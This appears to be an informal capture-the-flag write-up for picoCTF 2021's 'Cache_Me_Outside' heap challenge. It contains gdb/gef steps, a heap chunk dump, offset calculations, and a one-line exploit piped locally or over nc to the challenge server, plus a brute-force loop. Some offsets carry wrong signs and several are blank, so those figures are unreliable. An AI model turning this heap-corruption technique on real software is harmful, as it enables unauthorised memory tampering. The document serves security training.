# Cache_Me_Outside @ picoCTF 2021

this is heap overflow problem

## Notes
1. the files  heapedit, Makefile, libc.so.6 are given
heap edit doesn't work directly

2. we installed pwninit and gef
https://github.com/io12/pwninit

3. we followed https://www.youtube.com/watch?v=ioSRCLRDC9U

## Steps

1. run pwninit and once program is executable in kali, make a flag file called flag.txt
2. run ghidra and look at the code
3. `gdb heapedit_patched` 
4. `break main`
5. `run`
6. `break malloc`
7. `c` to continue
8. `heap bins` to see tcache addr
9. two cache entries at 0x603890 and 0x603800
10. do search-pattern for each :
    `search-pattern 0x603890`
    `search-pattern 0x603800`
11. we get 2 address for buffer pointer 0x602088 and 0x603890 
12. find offset for each, to calculate offset we need starting malloc addr


```
chunk(addr=0x602010, size=0x250, flags=PREV_INUSE | IS_MMAPPED | NON_MAIN_ARENA)
    [0x0000000000602010     00 00 00 00 00 00 00 02 00 00 00 00 00 00 00 00    ................]
Chunk(addr=0x602260, size=0x230, flags=PREV_INUSE | IS_MMAPPED | NON_MAIN_ARENA)
    [0x0000000000602260     88 24 ad fb 00 00 00 00 b3 24 60 00 00 00 00 00    .$.......$`.....]
Chunk(addr=0x602490, size=0x1010, flags=PREV_INUSE | IS_MMAPPED | NON_MAIN_ARENA)
    [0x0000000000602490     66 6c 61 67 20 68 65 68 65 68 65 68 65 68 65 68    flag heheheheheh]
Chunk(addr=0x6034a0, size=0x90, flags=PREV_INUSE | IS_MMAPPED | NON_MAIN_ARENA)
    [0x00000000006034a0     63 6f 6e 67 72 61 74 73 21 20 59 6f 75 72 20 66    congrats! Your f]
Chunk(addr=0x603530, size=0x90, flags=PREV_INUSE | IS_MMAPPED | NON_MAIN_ARENA)
    [0x0000000000603530     43 6f 6e 67 72 61 74 73 21 20 59 6f 75 72 20 66    Congrats! Your f]
Chunk(addr=0x6035c0, size=0x90, flags=PREV_INUSE | IS_MMAPPED | NON_MAIN_ARENA)
    [0x00000000006035c0     43 6f 6e 67 72 61 74 73 21 20 59 6f 75 72 20 66    Congrats! Your f]
Chunk(addr=0x603650, size=0x90, flags=PREV_INUSE | IS_MMAPPED | NON_MAIN_ARENA)
    [0x0000000000603650     43 6f 6e 67 72 61 74 73 21 20 59 6f 75 72 20 66    Congrats! Your f]
Chunk(addr=0x6036e0, size=0x90, flags=PREV_INUSE | IS_MMAPPED | NON_MAIN_ARENA)
    [0x00000000006036e0     43 6f 6e 67 72 61 74 73 21 20 59 6f 75 72 20 66    Congrats! Your f]
Chunk(addr=0x603770, size=0x90, flags=PREV_INUSE | IS_MMAPPED | NON_MAIN_ARENA)
    [0x0000000000603770     43 6f 6e 67 72 61 74 73 21 20 59 6f 75 72 20 66    Congrats! Your f]
Chunk(addr=0x603800, size=0x90, flags=PREV_INUSE | IS_MMAPPED | NON_MAIN_ARENA)
    [0x0000000000603800     00 00 00 00 00 00 00 00 21 20 59 6f 75 72 20 66    ........! Your f]
Chunk(addr=0x603890, size=0x90, flags=PREV_INUSE | IS_MMAPPED | NON_MAIN_ARENA)
    [0x0000000000603890     00 38 60 00 00 00 00 00 68 69 73 20 77 6f 6e 27    .8`.....his won']
Chunk(addr=0x603920, size=0x410, flags=PREV_INUSE | IS_MMAPPED | NON_MAIN_ARENA)
    [0x0000000000603920     63 0a 00 00 00 00 00 00 00 00 00 00 00 00 00 00    c...............]
Chunk(addr=0x603d30, size=0x1f2e0, flags=PREV_INUSE | IS_MMAPPED | NON_MAIN_ARENA)  ←  top chunk

```

13. we got these chunk addrs: 0x602010, 0x602490, 0x602260, 0x6034a0, 0x603530, 0x6035c0, 0x603650, 0x6036e0, 0x603770, 0x603800, 0x603890, 0x603920
14. we calculate offset for all these 
```
p/d 0x602088 - 0x602010 = 120 
p/d 0x602088 - 0x602490 = -1032 
p/d 0x602088 - 0x602260 = -472
p/d 0x602088 - 0x6034a0 = -5144
p/d 0x602088 - 0x603530 = -5288
p/d 0x602088 - 0x6035c0 = -5432
p/d 0x602088 - 0x603650 = -5576
p/d 0x602088 - 0x6036e0 = 5720 
p/d 0x602088 - 0x603770 = 5864
p/d 0x603890 - 0x602010 = 6272
p/d 0x603890 - 0x602490 = 5120
p/d 0x603890 - 0x602260 = 
p/d 0x603890 - 0x6034a0 =
p/d 0x603890 - 0x603530 =
p/d 0x603890 - 0x6035c0 =
p/d 0x603890 - 0x603650 =
p/d 0x603890 - 0x6036e0 =
p/d 0x603890 - 0x603770 =
```
and we can do exploit like : 
`{ echo "-5144"; printf "\x00";} | ./heapedit`
or remotely as 
`{ echo "-5144"; printf "\x00";} | nc mercury.picoctf.net 8054`


# Brute force Way
```sh
#!/bin/bash

for i in {1000..-6000}; do
  ( echo "$i"; printf "\x00"; ) | ./heapedit_patched
done
```

# now see how to do this with r2


